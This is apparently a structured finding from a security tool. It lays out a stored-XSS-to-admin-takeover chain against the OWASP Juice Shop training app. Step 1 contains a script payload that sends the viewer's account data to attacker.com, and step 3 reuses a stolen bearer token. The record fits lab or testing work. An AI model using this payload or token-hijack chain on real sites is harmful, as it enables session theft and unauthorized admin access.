{
 "title": "Juice Shop - XSS to Admin Account Takeover",
 "description": "Stored XSS in product review leads to session hijacking and admin access",
 "steps": [
 {
 "step_number": 1,
 "vulnerability_type": "Cross-Site Scripting",
 "description": "Stored XSS in product review comment field",
 "endpoint": "/rest/products/{id}/reviews",
 "payload": "<script>fetch('/rest/user/whoami', {credentials: 'include'}).then(r=>r.json()).then(d=>fetch('https://attacker.com/steal?token='+btoa(JSON.stringify(d))))</script>",
 "prerequisites": [],
 "outcome": "XSS payload stored in product review",
 "evidence": null
 },
 {
 "step_number": 2,
 "vulnerability_type": "Session Hijacking",
 "description": "XSS payload executes when admin views review, stealing session token",
 "endpoint": "Admin panel / product reviews",
 "payload": "Stolen JWT token from admin session",
 "prerequisites": [
 "XSS payload stored in product review"
 ],
 "outcome": "Admin session token obtained",
 "evidence": null
 },
 {
 "step_number": 3,
 "vulnerability_type": "Privilege Escalation",
 "description": "Use stolen admin token to access admin panel",
 "endpoint": "/#/administration",
 "payload": "Authorization: Bearer <stolen_token>",
 "prerequisites": [
 "Admin session token obtained"
 ],
 "outcome": "Unauthorized admin access achieved",
 "evidence": null
 }
 ],
 "impact": "Critical",
 "severity": "Critical",
 "prerequisites": [
 "Valid user account",
 "Ability to post product reviews"
 ],
 "context": "OWASP Juice Shop e-commerce application",
 "discovered_by": null,
 "discovered_at": "2025-12-31T11:24:17.478066",
 "validated": false,
 "tags": [
 "web",
 "xss",
 "privilege-escalation",
 "session-hijacking",
 "juice-shop"
 ]
}